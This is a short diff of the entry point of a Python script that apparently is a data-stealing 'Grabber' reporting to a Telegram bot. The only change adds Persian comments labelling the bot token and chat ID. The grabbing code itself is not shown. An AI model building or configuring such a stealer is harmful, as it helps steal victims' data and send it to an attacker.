@@ -315,8 +315,8 @@ class Grabber:
 
 
 if __name__ == '__main__':
-    TELE_KEY = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE") 
-    CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE") 
+    TELE_KEY = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")  # توکن بات شما
+    CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE") # آیدی عددی شما
 
     main_grabber_instance = Grabber(TELE_KEY, CHAT_ID)
     main_grabber_instance.exec()
